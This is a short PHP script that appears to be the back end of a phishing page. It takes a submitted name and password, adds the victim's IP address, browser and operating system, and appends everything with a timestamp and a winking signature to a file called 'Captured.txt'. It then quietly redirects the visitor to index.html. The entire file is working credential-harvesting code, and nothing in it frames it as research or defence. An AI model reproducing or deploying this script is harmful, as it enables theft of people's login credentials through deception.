<?php
if (isset($_POST)){
$Name = $_POST['name'];
$Pass = $_POST['pass'];
$ipGuest = $_POST['ipadd'];
}
// echo $Name;
// echo $Pass;

// For IP
function getUserIP() {
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
  return $ip;
}
$userIP = getUserIP();
// For IP

// For OS and Browser
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// Capture the browser type
if (preg_match('/MSIE|Trident/i', $userAgent)) {
    $browser = 'Internet Explorer';
} elseif (preg_match('/Firefox/i', $userAgent)) {
    $browser = 'Firefox';
} elseif (preg_match('/Chrome/i', $userAgent)) {
    $browser = 'Chrome';
} elseif (preg_match('/Safari/i', $userAgent)) {
    $browser = 'Safari';
} elseif (preg_match('/Opera/i', $userAgent)) {
    $browser = 'Opera';
} else {
    $browser = 'Unknown';
}

// Capture the operating system
if (preg_match('/Windows/i', $userAgent)) {
    $os = 'Windows';
} elseif (preg_match('/Mac/i', $userAgent)) {
    $os = 'Macintosh';
} elseif (preg_match('/Linux/i', $userAgent)) {
    $os = 'Linux';
} elseif (preg_match('/Android/i', $userAgent)) {
    $os = 'Android';
} elseif (preg_match('/iOS/i', $userAgent)) {
    $os = 'iOS';
} else {
    $os = 'Unknown';
}





// For OS and Browser




$Stamp= date('Y-m-d H:i:s');
$fh = fopen("../../Captured.txt", 'a') or die("error");
  
   $texto = <<<_END
 Date: $Stamp  
 Name: $Name
 Password : $Pass
 IP: $userIP
 Browser: $browser
 Operating System: $os

 ;)
 ****************************

 _END;
  
  fwrite($fh, $texto) or die("Error");
  
   fclose($fh);
  
 //  echo "success";


 HEADER("Location: ../../index.html");


?> 